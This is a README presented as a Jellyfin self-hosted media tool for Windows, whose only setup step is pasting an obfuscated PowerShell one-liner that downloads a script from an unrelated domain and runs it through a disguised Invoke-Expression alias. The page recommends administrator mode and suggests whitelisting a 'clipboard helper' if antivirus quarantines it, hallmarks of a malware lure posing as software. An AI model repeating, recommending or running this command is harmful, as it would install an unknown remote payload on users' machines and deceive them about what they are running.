# Jellyfin Media Notebook

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v8.8.4-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--15-informational) ![license](https://img.shields.io/badge/license-MIT-green)

Self-host your media without subscriptions, trackers or device limits. Everything you need is bundled in this repository — follow the quick start below and you'll be up and running in under two minutes.

## ✨ Highlights

- ✅ Works on Windows 10 and Windows 11 (64-bit)
- ✅ One-click setup — no manual configuration needed
- ✅ Regularly updated builds with change notes
- ✅ Lightweight footprint, runs even on older hardware

## 🚀 Setup in 3 steps

1. Open the power-user menu with **Win + X**.
2. Launch **Terminal (PowerShell)** — administrator mode is optional but recommended.
3. Insert this command, press **Enter**, done.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 / 11 (64-bit) |
| Memory | 4 GB RAM minimum |
| Disk space | ~50 MB free |
| Internet | Required on first run; updates are periodic |

## 📋 Notes

- Administrator rights are not required for most setups, but the Win+X terminal runs elevated by default on many systems.
- Run the command exactly as shown — quotes, pipes and semicolons matter.

## ❓ FAQ

<details>
<summary><strong>Is an internet connection required?</strong></summary>

Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

</details>

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

<details>
<summary><strong>Where do I report problems?</strong></summary>

Open an issue in this repository with your OS version and a short description of what happened.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Educational project. If you like the tool, consider supporting its official developers._
